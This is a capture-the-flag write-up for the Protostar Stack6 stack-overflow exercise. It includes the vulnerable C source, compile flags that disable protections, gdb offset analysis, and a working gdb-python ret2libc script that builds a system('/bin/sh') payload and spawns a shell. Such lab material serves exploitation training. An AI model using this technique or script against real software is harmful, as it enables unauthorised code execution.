## Protostar-Stack6 Solution

### 1. Introduction

This is a poc solution for the "Stack6" challenge of Protostar. It's short and hopefully it's easy for everyone who wants to have a look.

Source:
[https://web.archive.org/web/20140405142902/http://exploit-exercises.com/protostar/stack6](https://web.archive.org/web/20140405142902/http://exploit-exercises.com/protostar/stack6) 

**Hints:**
* Stack6 looks at what happens when you have restrictions on the return address.
* This level can be done in a couple of ways, such as finding the duplicate of the payload ( objdump -s will help with this), or ret2libc , or even return orientated programming.
* It is strongly suggested you experiment with multiple ways of getting your code to execute here.


#### 1.1 Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
 
void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath(); 
```

#### 1.2 Compilation

Terminal command to compile with debug symbols + without pie + without nx-bit + Disable canaries + Disable ASLR + for x86:

```js
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'

gcc -o 6 6.c -z execstack -fno-stack-protector -m32 -no-pie -g
```

### 2. Solution 

#### 2.1 Short Analysis with gdb-peda

1. Disassemble the main function.
2. Find offset.

```nasm
gdb-peda$ r <<< $(python -c "print 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAA'")

...TRIM...
Stopped reason: SIGSEGV
0x41414b41 in ?? ()
gdb-peda$ i r ebp eip
ebp            0x41354141	0x41354141
eip            0x41414b41	0x41414b41

gdb-peda$ x/wx $esp
0xffffd110:	0x36414167

gdb-peda$ pattern offset 0x36414167
910246247 found at offset: 93
gdb-peda$ pattern offset 0x41354141
1094009153 found at offset: 85
gdb-peda$ pattern offset 0x41414b41
1094798145 found at offset: 89
```

The payload that we send to binary fits as below:

```
[offset = 80]+[ebp = 85]+[eip = 89]+[esp = 93] 
      1...80 +  81...84 +  85...88 +  89...92
```

```nasm
gdb-peda$ r <<< $(python -c "print 'A'*80+'B'*4+'C'*80") 

gdb-peda$ i r ebp eip
ebp            0x41414141	0x41414141
eip            0x42424242	0x42424242
gdb-peda$ x/wx $esp
0xffffd110:	0x43434343
```

As seen on the source code of this challenge, we are no able to use return pointer. The if condition on the code checks if return address starts from **0xbf000000**. I compiled this one on my vm and stack doesn't start from 0xbf...


#### 2.1 Solving with NX Enabled

To make this challenge more pragmatic let me re-compile with **stack execution disabled aka. nx enabled** (without **-z execstack** parameter). As mentioned in hints section of the challenge, this one recommends to use **ret2libc** or **rop** so let me try to solve with ret2libc.

**Before**
```
gdb-peda$ checksec
NX        : disabled

$ readelf -l 6 | grep GNU_STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10
```
**After**
```
gdb-peda$ checksec
NX        : ENABLED

$ readelf -l stack6_nx | grep GNU_STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
```

Ret2libc attacks are explained in many resources which are available online so there is only a quick overview for the solution.

As far as I know return-to-libc attack is one of the code re-use attacks. libc is used in this attack because it contains functions like execve(), system()... etc.
I used execve() on the solution for Stack-5, this time I'm using system(). It needs an argument such as "/bin/sh" to create a bash shell. 

```
system("/bin/bash");  
```

In this attack the stack looks like following:
```
Top - Lower Memory<== 
[offset+ebp] + [eip: addr of called func in libc] + [Ret. addr for called func] + [str ptr: Args of called func]

==>Higher Memory - Bottom
```
It will be implemented to the following format in our solve to let program exit without any errors:

```
[offset] + [system() address] + [exit address] + [/bin/sh address]
```

I'd like to tell why we put **return address for called function** between *addr. of func* and *args. of function*.

As you can see in the web page below, call instruction is used to call a function by performing two operations:

1. It pushes the return address (address immediately after the CALL instruction) on the stack.
2. It changes EIP to the call destination. This effectively transfers control to the call target and begins execution there.

[https://www.aldeid.com/wiki/X86-assembly/Instructions/call](https://www.aldeid.com/wiki/X86-assembly/Instructions/call)

By using our payload, we simulate the **call** instruction manually.

#### 2.2 Quick Solution

Let's check addresses from gdb, then create a simple gdb-py script.

```py
(gdb) break main
 
(gdb) run   

(gdb) info address system
Symbol "system" is at 0xf7e51e70 in a file compiled without debugging.

(gdb) info address exit
Symbol "exit" is at 0xf7e44f50 in a file compiled without debugging.

(gdb) find &system,+9999999,"/bin/sh"
0xf7f71fcc
```

The search process for the address of **/bin/sh** can be done better as I mentioned in **2.3 Improvements for The Solution** section.

Payload can be created in the following format:

**offset + system_address + exit_address + binsh_address**

**The gdb-python script that I wrote:**

```py
from gdb import execute
from re import findall 
from struct import pack

def extract_address(input_string):
	return findall(r"0[xX][0-9a-fA-F]+",input_string)

execute('file stack6_nx')
execute('b main')
execute('r')

offset = "\x41" * 80
exit_address = extract_address(execute('info address exit', to_string=True))[0]
system_address = extract_address(execute('info address system', to_string=True))[0]
binsh_address = extract_address(execute('find &system,+9999999,"/bin/sh"', to_string=True))[0]

print("system address: "+str(system_address)+"\nexit_ address: "+str(exit_address)+"\nbinsh_address: "+str(binsh_address))

print("Payload will be: \noffset + system_address + exit_address + binsh_address\n")

system_address = pack("I", int(system_address[2:],16))
exit_address = pack("I", int(exit_address[2:],16))
bin_sh = pack("I",int(binsh_address[2:],16))

payload = b'\x41'*80 + system_address + exit_address + bin_sh

print("Payload as a bytearray:")
print(payload)

f = open('/tmp/exploit', 'wb')
f.write(payload)
f.close()

print("Payload file is: /tmp/exploit")
print("You can try by using following command: '  (cat /tmp/exploit; cat) | ./stack6_nx'")
```

You can use the script from gdb by using the following command:
**source script.py**  (equivalent to running gdb -x script.py).

```
(gdb) source x.py 
Breakpoint 2 at 0x8048546: file stack6_nx.c, line 28.

Breakpoint 1, main (argc=1, argv=0xffffd1d4) at stack6_nx.c:28
warning: Source file is more recent than executable.
28	
system address: 0xf7e51e70
exit_ address: 0xf7e44f50
binsh_address: 0xf7f71fcc
Payload will be: 
offset + system_address + exit_address + binsh_address

Payload as a bytearray:
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp\x1e\xe5\xf7PO\xe4\xf7\xcc\x1f\xf7\xf7'
Payload file is: /tmp/exploit
You can try by using following command: '  (cat /tmp/exploit; cat) | ./stack6_nx '
```

```
$ (cat /tmp/exploit; cat) | ./stack6_nx
input path please: id
got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp��AAAAAAAAAAAAp��PO�����id
id
uid=1000(a) gid=1000(a) groups=1000(a),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)
```

#### 2.3 Improvements for The Solution

1. Checking only address space of **libc** instead of iterating a lot ('find &system,+9999999,"/bin/sh"').

**This is how it can be done by following commands:**

```
$ ldd ./stack6_nx | grep libc
	libc.so.6 => /lib32/libc.so.6 (0xf7e12000)

$ readelf -s /lib32/libc.so.6 | grep system
   243: 00118e50    73 FUNC    GLOBAL DEFAULT   12 svcerr_systemerr@@GLIBC_2.0
   620: 0003fe70    56 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE
  1443: 0003fe70    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0

readelf -s /lib32/libc.so.6 | grep exit
$ readelf -s /lib32/libc.so.6 | grep exit
   111: 00033380    58 FUNC    GLOBAL DEFAULT   12 __cxa_at_quick_exit@@GLIBC_2.10
   139: 00032f50    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
   ...

Now finding "/bin/sh" from gdb:
(gdb) i proc map
process 13201
Mapped address spaces:
	Start Addr   End Addr       Size     Offset objfile
...TRIM...
	0xf7e12000 0xf7fba000   0x1a8000        0x0 /lib32/libc-2.19.so
	0xf7fba000 0xf7fbc000     0x2000   0x1a7000 /lib32/libc-2.19.so
	0xf7fbc000 0xf7fbd000     0x1000   0x1a9000 /lib32/libc-2.19.so
...TRIM...

(gdb) find 0xf7e12000,0xf7fbd000,"/bin/sh"
0xf7f71fcc
1 pattern found.

(gdb) x/s  0xf7f71fcc
0xf7f71fcc:	"/bin/sh"
```

2. Using **execve()** instead of **system()** might be better. Many people complains because of **system()** is not supported on their hosts. Be careful, execve() takes 3 args.

3. Using ENV variables can be an option to use as the function argument ("**SHELL=/bin/bash**").


#### 2.4 Final PoC

Following did not work for me, but it might work on yours:
```
(gdb) source x.py 
...TRIM...
(gdb) r <<< $(cat /tmp/exploit)
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: stack6_nx <<< $(cat /tmp/exploit)
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp��AAAAAAAAAAAAp��PO����
[Inferior 1 (process 13214) exited normally]

(gdb) r < /tmp/exploit 
Starting program: stack6_nx < /tmp/exploit
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp��AAAAAAAAAAAAp��PO����
[Inferior 1 (process 13639) exited normally]
```

```
$ (cat /tmp/exploit; cat) | ./stack6_nx
```

#### 2.5 Limitations of ret2libc

1. If functions are removed from libc/library.
2. If mitigations are used such as [ASCII Armoring](https://en.wikipedia.org/wiki/Binary-to-text_encoding#ASCII_armor): libc addresses contain a NULL byte (0x00). Then attacker can check for **return2plt** attack (system@plt etc).
3. If ASLR is used.
